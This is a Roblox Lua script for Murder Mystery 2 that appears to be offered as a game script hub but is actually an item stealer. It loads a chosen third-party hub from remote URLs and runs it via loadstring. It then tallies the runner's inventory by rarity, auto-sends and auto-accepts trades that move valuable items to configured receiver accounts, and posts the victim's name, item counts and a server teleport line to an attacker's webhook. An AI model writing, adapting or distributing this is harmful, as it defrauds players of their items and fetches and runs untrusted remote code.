repeat wait() until game:IsLoaded()

if getgenv().scriptexecuted then return end
getgenv().scriptexecuted = true

local games = {
    [142823291] = true,
    [335132309] = true,
    [636649648] = true
}

if not games[game.PlaceId] then
    game:GetService("Players").LocalPlayer:Kick("Unfortunately, this game is not supported.")
    while true do end
end

if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    warn("Script terminated due to an invalid webhook URL.")
    return
end

if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
    warn("Script terminated due to an invalid receivers table.")
    return
end

if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    warn("Script terminated due to an invalid custom URL.")
    return
end

if Config.FullInventory ~= true and Config.FullInventory ~= false then
    Config.FullInventory = true
end

-- Load the corresponding script
local scriptUrls = {
    ["Custom"] = Config.CustomLink,
    ["Overdrive H"] = "https://overdrive-h.ohd.workers.dev/?d=loader",
    ["Symphony Hub"] = "https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua",
    ["Highlight Hub"] = "https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main",
    ["Eclipse Hub"] = "https://api.eclipsehub.xyz/auth?key=" .. (getgenv().mainKey or "nil"),
    ["R3TH PRIV"] = "https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua",
    ["AshbornnHub"] = "https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua",
    ["Nexus"] = "https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"
}

if scriptUrls[Config.Script] then
    loadstring(game:HttpGet(scriptUrls[Config.Script]))()
end

-- Remaining script functionalities
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Trade = ReplicatedStorage.Trade
local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]

local Common = 0
local Uncommon = 0
local Rare = 0
local Legendary = 0
local Vintage = 0
local Godly = 0
local Ancient = 0
local Unique = 0

LocalPlayer.Idled:connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

local UIPath = LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") and LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main or LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
local Mobile = LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") == nil

function TapUI(button, check, button2)
    if check == "Active Check" and not button.Active then return end
    if check == "Text Check" and button ~= "^" then return end
    for _, event in pairs(events) do
        for _, connection in pairs(getconnections(button[event])) do
            connection:Fire()
        end
    end
end

function Rarity(color, amount, tradeable, requirepath, path)
    local Stack = tonumber(amount:match("x(%d+)")) or 1

    if tradeable and tradeable:FindFirstChild("Evo") then
        return
    end

    local r = math.floor(color.R * 255 + 0.5)
    local g = math.floor(color.G * 255 + 0.5)
    local b = math.floor(color.B * 255 + 0.5)

    if r == 106 and g == 106 and b == 106 then
        Common = Common + Stack
    elseif r == 0 and g == 255 and b == 255 then
        Uncommon = Uncommon + Stack
    elseif r == 0 and g == 200 and b == 0 then
        Rare = Rare + Stack
    elseif r == 220 and g == 0 and b == 5 then
        Legendary = Legendary + Stack
    elseif r == 255 and g == 0 and b == 179 then
        Godly = Godly + Stack
    elseif r == 100 and g == 10 and b == 255 then
        Ancient = Ancient + Stack
    elseif r == 240 and g == 140 and b == 0 then
        Unique = Unique + Stack
    else
        Vintage = Vintage + Stack
    end
end

function FullInventory()
    local Inventory = {}
    for _, v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
        for _, item in pairs(v.Container:GetChildren()) do
            if item:IsA("Frame") then
                Rarity(item.ItemName.BackgroundColor3, item.Container.Amount.Text, item:FindFirstChild("Tags"))
                if Config.FullInventory then
                    table.insert(Inventory, item.ItemName.Label.Text .. " " .. (item.Container.Amount.Text ~= "" and item.Container.Amount.Text or "x1"))
                end
            end
        end
    end
    for _, v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
        if v:IsA("Frame") then
            Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text)
            if Config.FullInventory then
                table.insert(Inventory, v.ItemName.Label.Text .. " " .. (v.Container.Amount.Text ~= "" and v.Container.Amount.Text or "x1"))
            end
        end
    end
    return Config.FullInventory and table.concat(Inventory, ", ") or "Full inventory set false."
end

FullInventory()

task.wait()

function Sendtrade(player)
    local Path = Mobile and LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard or LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
    TapUI(Path.Container.Close)
    TapUI(Path.Container.PlayerList[player].ActionButton)
    TapUI(Path.Popup.Container.Action.Trade)
    TapUI(Path.Popup.Container.Close)
end

function readchats(player)
    Players[player].Chatted:Connect(function(msg)
        if msg == Config.ResendTrade then
            Sendtrade(player)
        end
    end)
end

function Activate(player)
    for _, v in pairs(Config.Receivers) do
        if v == player then
            readchats(player)
            wait(10)
            Sendtrade(player)
        end
    end
end

ReplicatedStorage.Trade.StartTrade.OnClientEvent:Connect(function()
    task.wait(1)
    local Path = Mobile and LocalPlayer.PlayerGui.TradeGUI_Phone.Container or LocalPlayer.PlayerGui.TradeGUI.Container
    local ItemsInTrade = 0

    for _, v in pairs(Path.Items.Main:GetChildren()) do
        for _, item in pairs(v.Items.Container.Current.Container:GetChildren()) do
            if item:IsA("Frame") and item.ItemName.Label.Text ~= "Default Knife" and item.ItemName.Label.Text ~= "Default Gun" then
                if ItemsInTrade < 4 then
                    ItemsInTrade = ItemsInTrade + 1
                    local LoopsItem = tonumber(item.Container.Amount.Text:match("x(%d+)")) or 1
                    task.wait()
                    for _ = 1, LoopsItem do
                        TapUI(item.Container.ActionButton)
                    end
                end
            end
        end
    end

    task.wait(10)
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
end)

for _, player in pairs(Players:GetPlayers()) do
    Activate(player)
end

Players.PlayerAdded:Connect(function(player)
    Activate(player)
end)

local function SendWebhook()
    local CurrentTimestamp = os.time()
    local CurrentDateTime = os.date("!*t", CurrentTimestamp)

    local Payload = HttpService:JSONEncode({
        ["content"] = table.concat({
            Ancient > 0 or Godly > 0 and "--@everyone\n--" .. TeleportScript or TeleportScript,
            "**Inventory Details**",
            "**User:** `" .. LocalPlayer.Name .. "`",
            "**Common Items:** `" .. tostring(Common) .. "`",
            "**Uncommon Items:** `" .. tostring(Uncommon) .. "`",
            "**Rare Items:** `" .. tostring(Rare) .. "`",
            "**Legendary Items:** `" .. tostring(Legendary) .. "`",
            "**Vintage Items:** `" .. tostring(Vintage) .. "`",
            "**Godly Items:** `" .. tostring(Godly) .. "`",
            "**Ancient Items:** `" .. tostring(Ancient) .. "`",
            "**Unique Items:** `" .. tostring(Unique) .. "`"
        }, "\n"),
        ["username"] = "Trade Bot " .. CurrentDateTime.year .. "-" .. CurrentDateTime.month .. "-" .. CurrentDateTime.day .. " " .. CurrentDateTime.hour .. ":" .. CurrentDateTime.min .. ":" .. CurrentDateTime.sec,
    })

    local Response = syn and syn.request or request or http_request({
        Url = Config.Webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = Payload
    })
end

SendWebhook()
